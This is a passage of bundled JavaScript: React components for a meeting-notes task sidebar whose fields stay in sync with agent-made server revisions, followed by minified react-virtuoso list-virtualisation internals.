* While the field is not focused it shows the server's copy, so an agent
* revision appears on the next poll. While it is focused, a revision does not
* replace what the user is typing. On blur the user's text is written only if
* they changed it; a field they only focused takes the server's copy, so it
* cannot write a stale value back over the agent's update.
*/
function ServerSyncedInput({ value, onCommit, ...rest }) {
	const [draft, setDraft] = useState(value);
	const focusedRef = useRef(false);
	const atFocusRef = useRef(value);
	useEffect(() => {
		if (!focusedRef.current) setDraft(value);
	}, [value]);
	return /* @__PURE__ */ jsx(Input, {
		...rest,
		value: draft,
		onChange: (e) => setDraft(e.target.value),
		onFocus: (e) => {
			focusedRef.current = true;
			atFocusRef.current = e.target.value;
		},
		onBlur: (e) => {
			focusedRef.current = false;
			const typed = e.target.value;
			if (typed === atFocusRef.current) {
				setDraft(value);
				return;
			}
			onCommit(typed);
		}
	});
}
function TaskSidebar({ tasks, onClose, onAdd, onUpdate, onDelete }) {
	const ime = useImeGuard();
	const quickAddRef = useRef(null);
	const quickAdd = () => {
		const description = quickAddRef.current?.value.trim();
		if (!description) return;
		onAdd(description);
		if (quickAddRef.current) quickAddRef.current.value = "";
	};
	const open = tasks.filter((task) => task.review_status !== "archived");
	return /* @__PURE__ */ jsxs("aside", {
		className: "flex-none w-full h-[42%] min-h-[260px] border-t border-border lg:h-full lg:w-[340px] lg:border-t-0 lg:border-l bg-bg flex flex-col overflow-hidden",
		"aria-label": i18nT("apps.meetings.taskSidebar.title"),
		children: [
			/* @__PURE__ */ jsxs("div", {
				className: "flex items-center gap-2 px-4 py-3 border-b border-border",
				children: [/* @__PURE__ */ jsx("span", {
					className: "flex-1 font-medium text-sm text-text",
					children: i18nT("apps.meetings.taskSidebar.heading", { count: open.length })
				}), /* @__PURE__ */ jsx(Btn$1, {
					onClick: onClose,
					"aria-label": i18nT("apps.meetings.taskSidebar.close"),
					children: /* @__PURE__ */ jsx(X, { className: "lucide-inline" })
				})]
			}),
			/* @__PURE__ */ jsx("div", {
				className: "flex-1 overflow-y-auto p-3 flex flex-col gap-2",
				children: open.length === 0 ? /* @__PURE__ */ jsx("p", {
					className: "text-[13px] text-muted text-center mt-8",
					children: i18nT("apps.meetings.taskSidebar.empty")
				}) : open.map((task) => /* @__PURE__ */ jsxs("div", {
					className: "p-3 border border-border rounded-md flex flex-col gap-2 bg-card",
					children: [
						/* @__PURE__ */ jsx(ServerSyncedInput, {
							value: task.description,
							"aria-label": i18nT("apps.meetings.taskSidebar.descriptionLabel"),
							onCommit: (typed) => {
								const next = typed.trim();
								if (next && next !== task.description) onUpdate(task.id, { description: next });
							}
						}),
						/* @__PURE__ */ jsxs("div", {
							className: "flex items-center gap-2",
							children: [/* @__PURE__ */ jsx(ServerSyncedInput, {
								value: task.assignee,
								placeholder: i18nT("apps.meetings.taskSidebar.unassigned"),
								"aria-label": i18nT("apps.meetings.taskSidebar.assigneeLabel"),
								className: "flex-1",
								onCommit: (typed) => {
									if (typed.trim() !== task.assignee) onUpdate(task.id, { assignee: typed.trim() });
								}
							}), /* @__PURE__ */ jsx(SimpleSelect, {
								options: PRIORITIES,
								optionLabels: PRIORITIES.map((priority) => i18nT(PRIORITY_LABEL_KEY[priority])),
								value: task.priority,
								"aria-label": i18nT("apps.meetings.taskSidebar.priorityLabel"),
								onChange: (value) => onUpdate(task.id, { priority: value }),
								style: {
									flex: "0 0 auto",
									minWidth: 110
								}
							})]
						}),
						/* @__PURE__ */ jsxs("div", {
							className: "flex items-center gap-2",
							children: [
								/* @__PURE__ */ jsx(Badge, {
									variant: priorityBadge(task.priority),
									children: i18nT(PRIORITY_LABEL_KEY[task.priority])
								}),
								task.review_status === "pushed" && /* @__PURE__ */ jsx(Badge, {
									variant: "ok",
									children: i18nT("apps.meetings.taskSidebar.filed")
								}),
								/* @__PURE__ */ jsx(Btn$1, {
									danger: true,
									className: "ml-auto",
									onClick: () => onDelete(task.id),
									"aria-label": i18nT("apps.meetings.taskSidebar.deleteTask"),
									children: /* @__PURE__ */ jsx(Trash2, { className: "lucide-inline" })
								})
							]
						})
					]
				}, task.id))
			}),
			/* @__PURE__ */ jsxs("div", {
				className: "flex-none border-t border-border px-4 py-3 flex items-center gap-2",
				children: [/* @__PURE__ */ jsx(Input, {
					ref: quickAddRef,
					type: "text",
					className: "flex-1",
					placeholder: i18nT("apps.meetings.taskSidebar.quickAddPlaceholder"),
					"aria-label": i18nT("apps.meetings.taskSidebar.quickAddPlaceholder"),
					...ime.bindEnter({ onEnter: quickAdd })
				}), /* @__PURE__ */ jsxs(SendBtn, {
					onClick: quickAdd,
					"aria-label": i18nT("apps.meetings.taskSidebar.add"),
					children: [/* @__PURE__ */ jsx(Plus, { className: "lucide-inline" }), i18nT("apps.meetings.taskSidebar.add")]
				})]
			})
		]
	});
}
// node_modules/react-virtuoso/dist/index.mjs
var we = 0;
var Wt = 1;
var Zt = 2;
var kn = 4;
function un(t) {
	return () => t;
}
function fo(t) {
	t();
}
function re(t, e) {
	return (n) => t(e(n));
}
function an(t, e) {
	return () => t(e);
}
function mo(t, e) {
	return (n) => t(e, n);
}
function Ae(t) {
	return t !== void 0;
}
function po(...t) {
	return () => {
		t.map(fo);
	};
}
function Xt() {}
function ye(t, e) {
	return e(t), t;
}
function ho(t, e) {
	return e(t);
}
function ot(...t) {
	return t;
}
function Y(t, e) {
	return t(Wt, e);
}
function _(t, e) {
	t(we, e);
}
function Me(t) {
	t(Zt);
}
function it(t) {
	return t(kn);
}
function L(t, e) {
	return Y(t, mo(e, we));
}
function yt(t, e) {
	const n = t(Wt, (o) => {
		n(), e(o);
	});
	return n;
}
function dn(t) {
	let e, n;
	return (o) => (r) => {
		e = r, n && clearTimeout(n), n = setTimeout(() => {
			o(e);
		}, t);
	};
}
function Ln(t, e) {
	return t === e;
}
function et(t = Ln) {
	let e;
	return (n) => (o) => {
		t(e, o) || (e = o, n(o));
	};
}
function W(t) {
	return (e) => (n) => {
		t(n) && e(n);
	};
}
function B(t) {
	return (e) => re(e, t);
}
function Bt(t) {
	return (e) => () => {
		e(t);
	};
}
function I(t, ...e) {
	const n = go(...e);
	return ((o, r) => {
		switch (o) {
			case Zt:
				Me(t);
				return;
			case Wt: return Y(t, n(r));
		}
	});
}
function Ot(t, e) {
	return (n) => (o) => {
		n(e = t(e, o));
	};
}
function $t(t) {
	return (e) => (n) => {
		t > 0 ? t-- : e(n);
	};
}
function zt(t) {
	let e = null, n;
	return (o) => (r) => {
		e = r, !n && (n = setTimeout(() => {
			n = void 0, o(e);
		}, t));
	};
}
function $(...t) {
	const e = new Array(t.length);
	let n = 0, o = null;
	const r = 2 ** t.length - 1;
	return t.forEach((s, i) => {
		const l = 2 ** i;
		Y(s, (c) => {
			const d = n;
			n |= l, e[i] = c, d !== r && n === r && o && (o(), o = null);
		});
	}), (s) => (i) => {
		const l = () => {
			s([i].concat(e));
		};
		n === r ? l() : o = l;
	};
}
function go(...t) {
	return (e) => t.reduceRight(ho, e);
}
function Io(t) {
	let e, n;
	const o = () => e?.();
	return function(r, s) {
		switch (r) {
			case Wt: return s ? n === s ? void 0 : (o(), n = s, e = Y(t, s), e) : (o(), Xt);
			case Zt:
				o(), n = null;
				return;
		}
	};
}
function v(t) {
	let e = t;
	const n = U();
	return ((o, r) => {
		switch (o) {
			case we:
				e = r;
				break;
			case Wt:
				r(e);
				break;
			case kn: return e;
		}
		return n(o, r);
	});
}
function ht(t, e) {
	return ye(v(e), (n) => L(t, n));
}
function U() {
	const t = [];
	return ((e, n) => {
		switch (e) {
			case we:
				t.slice().forEach((o) => {
					o(n);
				});
				return;
			case Zt:
				t.splice(0, t.length);
				return;
			case Wt: return t.push(n), () => {
				const o = t.indexOf(n);
				o > -1 && t.splice(o, 1);
			};
		}
	});
}
function vt(t) {
	return ye(U(), (e) => L(t, e));
}
function j(t, e = [], { singleton: n } = { singleton: !0 }) {
	return {
		constructor: t,
		dependencies: e,
		id: xo(),
		singleton: n
	};
}
var xo = () => Symbol();
function So(t) {
	const e = /* @__PURE__ */ new Map(), n = ({ constructor: o, dependencies: r, id: s, singleton: i }) => {
		if (i && e.has(s)) return e.get(s);
		const l = o(r.map((c) => n(c)));
		return i && e.set(s, l), l;
	};
	return n(t);
}
function at(...t) {
	const e = U(), n = new Array(t.length);
	let o = 0;
	const r = 2 ** t.length - 1;
	return t.forEach((s, i) => {
		const l = 2 ** i;
		Y(s, (c) => {
			n[i] = c, o |= l, o === r && _(e, n);
		});
	}), function(s, i) {
		switch (s) {
			case Zt:
				Me(e);
				return;
			case Wt: return o === r && i(n), Y(e, i);
		}
	};
}
function P(t, e = Ln) {
	return I(t, et(e));
}
function ze(...t) {
	return function(e, n) {
		switch (e) {
			case Zt: return;
			case Wt: return po(...t.map((o) => Y(o, n)));
		}
	};
}
var ft = {
	/** Detailed debugging information including item measurements */
	DEBUG: 0,
	/** General informational messages */
	INFO: 1,
	/** Warning messages for potential issues */
	WARN: 2,
	/** Error messages for failures (default level) */
	ERROR: 3
};
var To = {
	[ft.DEBUG]: "debug",
	[ft.ERROR]: "error",
	[ft.INFO]: "log",
	[ft.WARN]: "warn"
};
var vo = () => typeof globalThis > "u" ? window : globalThis;
var Gt = j(() => {
	const t = v(ft.ERROR);
	return {
		log: v((n, o, r = ft.INFO) => {
			r >= (vo().VIRTUOSO_LOG_LEVEL ?? it(t)) && console[To[r]]("%creact-virtuoso: %c%s %o", "color: #0253b3; font-weight: bold", "color: initial", n, o);
		}),
		logLevel: t
	};
}, [], { singleton: !0 });
function kt(t, e, n) {
	return _e(t, e, n).callbackRef;
}
function _e(t, e, n) {
	const o = H.useRef(null);
	let r = (i) => {};
	const s = H.useMemo(() => typeof ResizeObserver < "u" ? new ResizeObserver((i) => {
		const l = () => {
			const c = i[0].target;
			c.offsetParent !== null && t(c);
		};
		n ? l() : requestAnimationFrame(l);
	}) : null, [t, n]);
	return r = (i) => {
		i && e ? (s?.observe(i), o.current = i) : (o.current && s?.unobserve(o.current), o.current = null);
	}, {
		callbackRef: r,
		ref: o
	};
}
function zn(t, e, n, o, r, s, i, l, c) {
	return _e(H.useCallback((m) => {
		const x = Co(m.children, e, l ? "offsetWidth" : "offsetHeight", r);
		let p = m.parentElement;
		for (; p.dataset.virtuosoScroller === void 0;) p = p.parentElement;
		const T = p.lastElementChild.dataset.viewportType === "window";
		let w;
		T && (w = p.ownerDocument.defaultView);
		const R = i ? l ? i.scrollLeft : i.scrollTop : T ? l ? w.scrollX || w.document.documentElement.scrollLeft : w.scrollY || w.document.documentElement.scrollTop : l ? p.scrollLeft : p.scrollTop, h = i ? l ? i.scrollWidth : i.scrollHeight : T ? l ? w.document.documentElement.scrollWidth : w.document.documentElement.scrollHeight : l ? p.scrollWidth : p.scrollHeight, f = i ? l ? i.offsetWidth : i.offsetHeight : T ? l ? w.innerWidth : w.innerHeight : l ? p.offsetWidth : p.offsetHeight;
		o({
			scrollHeight: h,
			scrollTop: Math.max(R, 0),
			viewportHeight: f
		}), s?.(l ? fn("column-gap", getComputedStyle(m).columnGap, r) : fn("row-gap", getComputedStyle(m).rowGap, r)), x !== null && t(x);
	}, [
		t,
		e,
		r,
		s,
		i,
		o,
		l
	]), n, c);
}
function Co(t, e, n, o) {
	const r = t.length;
	if (r === 0) return null;
	const s = [];
	for (let i = 0; i < r; i++) {
		const l = t.item(i);
		if (l.dataset.index === void 0) continue;
		const c = parseInt(l.dataset.index), d = parseFloat(l.dataset.knownSize), m = e(l, n);
		if (m === 0 && o("Zero-sized element, this should not happen", { child: l }, ft.ERROR), m === d) continue;
		const x = s[s.length - 1];
		s.length === 0 || x.size !== m || x.endIndex !== c - 1 ? s.push({
			endIndex: c,
			size: m,
			startIndex: c
		}) : s[s.length - 1].endIndex++;
	}
	return s;
}
function fn(t, e, n) {
	return e !== "normal" && e?.endsWith("px") !== !0 && n(`${t} was not resolved to pixel value correctly`, e, ft.WARN), e === "normal" ? 0 : parseInt(e ?? "0", 10);
}
function Ne(t, e, n) {
	const o = H.useRef(null), r = H.useCallback((c) => {
		if (!c?.offsetParent) return;
		const d = c.getBoundingClientRect(), m = d.width;
		let x, p;
		if (e) {
			const T = e.getBoundingClientRect(), w = d.top - T.top;
			p = T.height - Math.max(0, w), x = w + e.scrollTop;
		} else {
			const T = i.current.ownerDocument.defaultView;
			p = T.innerHeight - Math.max(0, d.top), x = d.top + T.scrollY;
		}
		o.current = {
			offsetTop: x,
			visibleHeight: p,
			visibleWidth: m
		}, t(o.current);
	}, [t, e]), { callbackRef: s, ref: i } = _e(r, !0, n), l = H.useCallback(() => {
		r(i.current);
	}, [r, i]);
	return H.useEffect(() => {
		if (e) {
			e.addEventListener("scroll", l);
			const d = new ResizeObserver(() => {
				requestAnimationFrame(l);
			});
			return d.observe(e), () => {
				e.removeEventListener("scroll", l), d.unobserve(e);
			};
		}
		const c = i.current?.ownerDocument.defaultView;
		return c?.addEventListener("scroll", l), c?.addEventListener("resize", l), () => {
			c?.removeEventListener("scroll", l), c?.removeEventListener("resize", l);
		};
	}, [
		l,
		e,
		i
	]), s;
}
var It = j(() => {
	const t = U(), e = U(), n = v(0), o = U(), r = v(0), s = U(), i = U(), l = v(0), c = v(0), d = v(0), m = v(0), x = U(), p = U(), T = v(!1), w = v(!1), R = v(!1);
	return L(I(t, B(({ scrollTop: h }) => h)), e), L(I(t, B(({ scrollHeight: h }) => h)), i), L(e, r), {
		deviation: n,
		fixedFooterHeight: d,
		fixedHeaderHeight: c,
		footerHeight: m,
		headerHeight: l,
		horizontalDirection: w,
		scrollBy: p,
		scrollContainerState: t,
		scrollHeight: i,
		scrollingInProgress: T,
		scrollTo: x,
		scrollTop: e,
		skipAnimationFrameInResizeObserver: R,
		smoothScrollTargetReached: o,
		statefulScrollTop: r,
		viewportHeight: s
	};
}, [], { singleton: !0 });
var se = { lvl: 0 };
function Fn(t, e) {
	const n = t.length;
	if (n === 0) return [];
	let { index: o, value: r } = e(t[0]);
	const s = [];
	for (let i = 1; i < n; i++) {
		const { index: l, value: c } = e(t[i]);
		s.push({
			end: l - 1,
			start: o,
			value: r
		}), o = l, r = c;
	}
	return s.push({
		end: 1 / 0,
		start: o,
		value: r
	}), s;
}
function J(t) {
	return t === se;
}
function ie(t, e) {
	if (!J(t)) return e === t.k ? t.v : e < t.k ? ie(t.l, e) : ie(t.r, e);
}
function Rt(t, e, n = "k") {
	if (J(t)) return [-1 / 0, void 0];
	if (Number(t[n]) === e) return [t.k, t.v];
	if (Number(t[n]) < e) {
		const o = Rt(t.r, e, n);
		return o[0] === -1 / 0 ? [t.k, t.v] : o;
	}
	return Rt(t.l, e, n);
}
function Tt(t, e, n) {
	return J(t) ? Wn(e, n, 1) : e === t.k ? dt(t, {
		k: e,
		v: n
	}) : e < t.k ? mn(dt(t, { l: Tt(t.l, e, n) })) : mn(dt(t, { r: Tt(t.r, e, n) }));
}
function qt() {
	return se;
}
function Yt(t, e, n) {
	if (J(t)) return [];
	const o = Rt(t, e)[0];
	return wo(Ve(t, o, n));
}
function Fe(t, e) {
	if (J(t)) return se;
	const { k: n, l: o, r } = t;
	if (e === n) {
		if (J(o)) return r;
		if (J(r)) return o;
		const [s, i] = Pn(o);
		return Se(dt(t, {
			k: s,
			l: Vn(o),
			v: i
		}));
	}
	return e < n ? Se(dt(t, { l: Fe(o, e) })) : Se(dt(t, { r: Fe(r, e) }));
}
function _t(t) {
	return J(t) ? [] : [
		..._t(t.l),
		{
			k: t.k,
			v: t.v
		},
		..._t(t.r)
	];
}
function Ve(t, e, n) {
	if (J(t)) return [];
	const { k: o, l: r, r: s, v: i } = t;
	let l = [];
	return o > e && (l = l.concat(Ve(r, e, n))), o >= e && o <= n && l.push({
		k: o,
		v: i
	}), o <= n && (l = l.concat(Ve(s, e, n))), l;
}
function Se(t) {
	const { l: e, lvl: n, r: o } = t;
	if (o.lvl >= n - 1 && e.lvl >= n - 1) return t;
	if (n > o.lvl + 1) {
		if (He(e)) return Gn(dt(t, { lvl: n - 1 }));
		if (!J(e) && !J(e.r)) return dt(e.r, {
			l: dt(e, { r: e.r.l }),
			lvl: n,
			r: dt(t, {
				l: e.r.r,
				lvl: n - 1
			})
		});
		throw new Error("Unexpected empty nodes");
	}
	if (He(t)) return Pe(dt(t, { lvl: n - 1 }));
	if (!J(o) && !J(o.l)) {
		const r = o.l, s = He(r) ? o.lvl - 1 : o.lvl;
		return dt(r, {
			l: dt(t, {
				lvl: n - 1,
				r: r.l
			}),
			lvl: r.lvl + 1,
			r: Pe(dt(o, {
				l: r.r,
				lvl: s
			}))
		});
	}
	throw new Error("Unexpected empty nodes");
}
function dt(t, e) {
	return Wn(e.k !== void 0 ? e.k : t.k, e.v !== void 0 ? e.v : t.v, e.lvl !== void 0 ? e.lvl : t.lvl, e.l !== void 0 ? e.l : t.l, e.r !== void 0 ? e.r : t.r);
}
function Vn(t) {
	return J(t.r) ? t.l : Se(dt(t, { r: Vn(t.r) }));
}
function He(t) {
	return J(t) || t.lvl > t.r.lvl;
}
function Pn(t) {
	return J(t.r) ? [t.k, t.v] : Pn(t.r);
}
function Wn(t, e, n, o = se, r = se) {
	return {
		k: t,
		l: o,
		lvl: n,
		r,
		v: e
	};
}
function mn(t) {
	return Pe(Gn(t));
}
function Gn(t) {
	const { l: e } = t;
	return !J(e) && e.lvl === t.lvl ? dt(e, { r: dt(t, { l: e.r }) }) : t;
}
function Pe(t) {
	const { lvl: e, r: n } = t;
	return !J(n) && !J(n.r) && n.lvl === e && n.r.lvl === e ? dt(n, {
		l: dt(t, { r: n.l }),
		lvl: e + 1
	}) : t;
}
function wo(t) {
	return Fn(t, ({ k: e, v: n }) => ({
		index: e,
		value: n
	}));
}
function An(t, e) {
	return !!(t && t.startIndex === e.startIndex && t.endIndex === e.endIndex);
}
function le(t, e) {
	return !!(t && t[0] === e[0] && t[1] === e[1]);
}
var De = j(() => ({ recalcInProgress: v(!1) }), [], { singleton: !0 });
function Mn(t, e, n) {
	return t[ve(t, e, n)];
}
function ve(t, e, n, o = 0) {
	let r = t.length - 1;
	for (; o <= r;) {
		const s = Math.floor((o + r) / 2), i = t[s], l = n(i, e);
		if (l === 0) return s;
		if (l === -1) {
			if (r - o < 2) return s - 1;
			r = s - 1;
		} else {
			if (r === o) return s;
			o = s + 1;
		}
	}
	throw new Error(`Failed binary finding record in array - ${t.join(",")}, searched for ${e}`);
}
function yo(t, e, n, o) {
	const r = ve(t, e, o), s = ve(t, n, o, r);
	return t.slice(r, s + 1);
}
function Et(t, e) {
	return Math.round(t.getBoundingClientRect()[e]);
}
function be(t) {
	return !J(t.groupOffsetTree);
}
function $e({ index: t }, e) {
	return e === t ? 0 : e < t ? -1 : 1;
}
function bo() {
	return {
		groupIndices: [],
		groupOffsetTree: qt(),
		lastIndex: 0,
		lastOffset: 0,
		lastSize: 0,
		offsetTree: [],
		sizeTree: qt()
	};
}
function Ro(t, e) {
	let n = J(t) ? 0 : 1 / 0;
	for (const o of e) {
		const { endIndex: r, size: s, startIndex: i } = o;
		if (n = Math.min(n, i), J(t)) {
			t = Tt(t, 0, s);
			continue;
		}
		const l = Yt(t, i - 1, r + 1);
		if (l.some(zo(o))) continue;
		let c = !1, d = !1;
		for (const { end: m, start: x, value: p } of l) c ? (r >= x || s === p) && (t = Fe(t, x)) : (d = p !== s, c = !0), m > r && r >= x && p !== s && (t = Tt(t, r + 1, p));
		d && (t = Tt(t, i, s));
	}
	return [t, n];
}
function Eo(t) {
	return typeof t.groupIndex < "u";
}
function Ho({ offset: t }, e) {
	return e === t ? 0 : e < t ? -1 : 1;
}
function ce(t, e, n) {
	if (e.length === 0) return 0;
	const { index: o, offset: r, size: s } = Mn(e, t, $e), i = t - o, l = s * i + (i - 1) * n + r;
	return l > 0 ? l + n : l;
}
function _n(t, e) {
	if (!be(e)) return t;
	let n = 0;
	for (; e.groupIndices[n] <= t + n;) n++;
	return t + n;
}
function Nn(t, e, n) {
	if (Eo(t)) return e.groupIndices[t.groupIndex] + 1;
	let r = _n(t.index === "LAST" ? n : t.index, e);
	return r = Math.max(0, r, Math.min(n, r)), r;
}
function Bo(t, e, n, o = 0) {
	return o > 0 && (e = Math.max(e, Mn(t, o, $e).offset)), Fn(yo(t, e, n, Ho), Lo);
}
function Oo(t, [e, n, o, r]) {
	e.length > 0 && o("received item sizes", e, ft.DEBUG);
	const s = t.sizeTree;
	let i = s, l = 0;
	if (n.length > 0 && J(s) && e.length === 2) {
		const p = e[0].size, T = e[1].size;
		i = n.reduce((w, R) => Tt(Tt(w, R, p), R + 1, T), i);
	} else [i, l] = Ro(i, e);
	if (i === s) return t;
	const { lastIndex: c, lastOffset: d, lastSize: m, offsetTree: x } = We(t.offsetTree, l, i, r);
	return {
		groupIndices: n,
		groupOffsetTree: n.reduce((p, T) => Tt(p, T, ce(T, x, r)), qt()),
		lastIndex: c,
		lastOffset: d,
		lastSize: m,
		offsetTree: x,
		sizeTree: i
	};
}
function ko(t) {
	return _t(t).map(({ k: e, v: n }, o, r) => {
		const s = r[o + 1];
		return {
			endIndex: s !== void 0 ? s.k - 1 : 1 / 0,
			size: n,
			startIndex: e
		};
	});
}
function pn(t, e) {
	let n = 0, o = 0;
	for (; n < t;) n += e[o + 1] - e[o] - 1, o++;
	return o - (n === t ? 0 : 1);
}
function We(t, e, n, o) {
	let r = t, s = 0, i = 0, l = 0, c = 0;
	if (e !== 0) {
		c = ve(r, e - 1, $e), l = r[c].offset;
		const m = Rt(n, e - 1);
		s = m[0], i = m[1], r.length && r[c].size === Rt(n, e)[1] && (c -= 1), r = r.slice(0, c + 1);
	} else r = [];
	for (const { start: d, value: m } of Yt(n, e, 1 / 0)) {
		const x = d - s, p = x * i + l + x * o;
		r.push({
			index: d,
			offset: p,
			size: m
		}), s = d, l = p, i = m;
	}
	return {
		lastIndex: s,
		lastOffset: l,
		lastSize: i,
		offsetTree: r
	};
}
function Lo(t) {
	return {
		index: t.index,
		value: t
	};
}
function zo(t) {
	const { endIndex: e, size: n, startIndex: o } = t;
	return (r) => r.start === o && (r.end === e || r.end === 1 / 0) && r.value === n;
}
var Fo = {
	offsetHeight: "height",
	offsetWidth: "width"
};
var Lt = j(([{ log: t }, { recalcInProgress: e }]) => {
	const n = U(), o = U(), r = ht(o, 0), s = U(), i = U(), l = v(0), c = v([]), d = v(void 0), m = v(void 0), x = v(void 0), p = v(void 0), T = v((u, g) => Et(u, Fo[g])), w = v(void 0), R = v(0), h = bo(), f = ht(I(n, $(c, t, R), Ot(Oo, h), et()), h), a = ht(I(c, et(), Ot((u, g) => ({
		current: g,
		prev: u.current
	}), {
		current: [],
		prev: []
	}), B(({ prev: u }) => u)), []);
	L(I(c, W((u) => u.length > 0), $(f, R), B(([u, g, C]) => {
		const z = u.reduce((O, V, N) => Tt(O, V, ce(V, g.offsetTree, C) || N), qt());
		return {
			...g,
			groupIndices: u,
			groupOffsetTree: z
		};
	})), f), L(I(o, $(f), W(([u, { lastIndex: g }]) => u < g), B(([u, { lastIndex: g, lastSize: C }]) => [{
		endIndex: g,
		size: C,
		startIndex: u
	}])), n), L(d, m);
	const S = ht(I(d, B((u) => u === void 0)), !0);
	L(I(m, W((u) => u !== void 0 && J(it(f).sizeTree)), B((u) => {
		const g = it(x), C = it(c).length > 0;
		return g !== void 0 && g !== 0 ? C ? [{
			endIndex: 0,
			size: g,
			startIndex: 0
		}, {
			endIndex: 1,
			size: u,
			startIndex: 1
		}] : [] : [{
			endIndex: 0,
			size: u,
			startIndex: 0
		}];
	})), n), L(I(p, W((u) => u !== void 0 && u.length > 0 && J(it(f).sizeTree)), B((u) => {
		const g = [];
		let C = u[0], z = 0;
		for (let O = 1; O < u.length; O++) {
			const V = u[O];
			V !== C && (g.push({
				endIndex: O - 1,
				size: C,
				startIndex: z
			}), C = V, z = O);
		}
		return g.push({
			endIndex: u.length - 1,
			size: C,
			startIndex: z
		}), g;
	})), n), L(I(c, $(x, m), W(([, u, g]) => u !== void 0 && g !== void 0), B(([u, g, C]) => {
		const z = [];
		for (let O = 0; O < u.length; O++) {
			const V = u[O], N = u[O + 1];
			z.push({
				startIndex: V,
				endIndex: V,
				size: g
			}), N !== void 0 && z.push({
				startIndex: V + 1,
				endIndex: N - 1,
				size: C
			});
		}
		return z;
	})), n);
	const E = vt(I(n, $(f), Ot(({ sizes: u }, [g, C]) => ({
		changed: C !== u,
		sizes: C
	}), {
		changed: !1,
		sizes: h
	}), B((u) => u.changed)));
	Y(I(l, Ot((u, g) => ({
		diff: u.prev - g,
		prev: g
	}), {
		diff: 0,
		prev: 0
	}), B((u) => u.diff)), (u) => {
		const { groupIndices: g } = it(f);
		if (u > 0) _(e, !0), _(s, u + pn(u, g));
		else if (u < 0) {
			const C = it(a);
			C.length > 0 && (u -= pn(-u, C)), _(i, u);
		}
	}), Y(I(l, $(t)), ([u, g]) => {
		u < 0 && g("`firstItemIndex` prop should not be set to less than zero. If you don't know the total count, just use a very high value", { firstItemIndex: l }, ft.ERROR);
	});
	const y = vt(s);
	L(I(s, $(f), B(([u, g]) => {
		const C = g.groupIndices.length > 0, z = [], O = g.lastSize;
		if (C) {
			const V = ie(g.sizeTree, 0);
			let N = 0, Z = 0;
			for (; N < u;) {
				const q = g.groupIndices[Z], Q = g.groupIndices.length === Z + 1 ? 1 / 0 : g.groupIndices[Z + 1] - q - 1;
				z.push({
					endIndex: q,
					size: V,
					startIndex: q
				}), z.push({
					endIndex: q + 1 + Q - 1,
					size: O,
					startIndex: q + 1
				}), Z++, N += Q + 1;
			}
			const F = _t(g.sizeTree);
			return N !== u && F.shift(), F.reduce((q, { k: Q, v: gt }) => {
				let ut = q.ranges;
				return q.prevSize !== 0 && (ut = [...q.ranges, {
					endIndex: Q + u - 1,
					size: q.prevSize,
					startIndex: q.prevIndex
				}]), {
					prevIndex: Q + u,
					prevSize: gt,
					ranges: ut
				};
			}, {
				prevIndex: u,
				prevSize: 0,
				ranges: z
			}).ranges;
		}
		return _t(g.sizeTree).reduce((V, { k: N, v: Z }) => ({
			prevIndex: N + u,
			prevSize: Z,
			ranges: [...V.ranges, {
				endIndex: N + u - 1,
				size: V.prevSize,
				startIndex: V.prevIndex
			}]
		}), {
			prevIndex: 0,
			prevSize: O,
			ranges: []
		}).ranges;
	})), n);
	const k = vt(I(i, $(f, R), B(([u, { offsetTree: g }, C]) => {
		return ce(-u, g, C);
	})));
	return L(I(i, $(f, R), B(([u, g, C]) => {
		if (g.groupIndices.length > 0) {
			if (J(g.sizeTree)) return g;
			let V = qt();
			const N = it(a);
			let Z = 0, F = 0, mt = 0;
			for (; Z < -u;) {
				mt = N[F];
				const Q = N[F + 1] - mt - 1;
				F++, Z += Q + 1;
			}
			if (V = _t(g.sizeTree).reduce((Q, { k: gt, v: ut }) => Tt(Q, Math.max(0, gt + u), ut), V), Z !== -u) {
				const Q = ie(g.sizeTree, mt);
				V = Tt(V, 0, Q);
				const gt = Rt(g.sizeTree, -u + 1)[1];
				V = Tt(V, 1, gt);
			}
			return {
				...g,
				sizeTree: V,
				...We(g.offsetTree, 0, V, C)
			};
		}
		const O = _t(g.sizeTree).reduce((V, { k: N, v: Z }) => Tt(V, Math.max(0, N + u), Z), qt());
		return {
			...g,
			sizeTree: O,
			...We(g.offsetTree, 0, O, C)
		};
	})), f), {
		beforeUnshiftWith: y,
		data: w,
		defaultItemSize: m,
		firstItemIndex: l,
		fixedItemSize: d,
		fixedGroupSize: x,
		gap: R,
		groupIndices: c,
		heightEstimates: p,
		itemSize: T,
		listRefresh: E,
		shiftWith: i,
		shiftWithOffset: k,
		sizeRanges: n,
		sizes: f,
		statefulTotalCount: r,
		totalCount: o,
		trackItemSizes: S,
		unshiftWith: s
	};
}, ot(Gt, De), { singleton: !0 });
function Vo(t) {
	return t.reduce((e, n) => (e.groupIndices.push(e.totalCount), e.totalCount += n + 1, e), {
		groupIndices: [],
		totalCount: 0
	});
}
var Dn = j(([{ groupIndices: t, sizes: e, totalCount: n }, { headerHeight: o, scrollTop: r }]) => {
	const s = U(), i = U(), l = vt(I(s, B(Vo)));
	return L(I(l, B((c) => c.totalCount)), n), L(I(l, B((c) => c.groupIndices)), t), L(I(at(r, e, o), W(([c, d]) => be(d)), B(([c, d, m]) => Rt(d.groupOffsetTree, Math.max(c - m, 0), "v")[0]), et(), B((c) => [c])), i), {
		groupCounts: s,
		topItemsIndexes: i
	};
}, ot(Lt, It));
var At = j(([{ log: t }]) => {
	const e = v(!1), n = vt(I(e, W((o) => o), et()));
	return Y(e, (o) => {
		o && it(t)("props updated", {}, ft.DEBUG);
	}), {
		didMount: n,
		propsReady: e
	};
}, ot(Gt), { singleton: !0 });
var Po = typeof document < "u" && "scrollBehavior" in document.documentElement.style;
function $n(t) {
	const e = typeof t == "number" ? { index: t } : t;
	return e.align || (e.align = "start"), (!e.behavior || !Po) && (e.behavior = "auto"), e.offset === void 0 && (e.offset = 0), e;
}
var fe = j(([{ gap: t, listRefresh: e, sizes: n, totalCount: o }, { fixedFooterHeight: r, fixedHeaderHeight: s, footerHeight: i, headerHeight: l, scrollingInProgress: c, scrollTo: d, smoothScrollTargetReached: m, viewportHeight: x }, { log: p }]) => {
	const T = U(), w = U(), R = v(0);
	let h = null, f = null, a = null;
	function S() {
		h !== null && (h(), h = null), a !== null && (a(), a = null), f && (clearTimeout(f), f = null), _(c, !1);
	}
	return L(I(T, $(n, x, o, R, l, i, p), $(t, s, r), B(([[E, y, k, u, g, C, z, O], V, N, Z]) => {
		const F = $n(E), { align: mt, behavior: q, offset: Q } = F, gt = u - 1, ut = Nn(F, y, gt);
		let xt = ce(ut, y.offsetTree, V) + C;
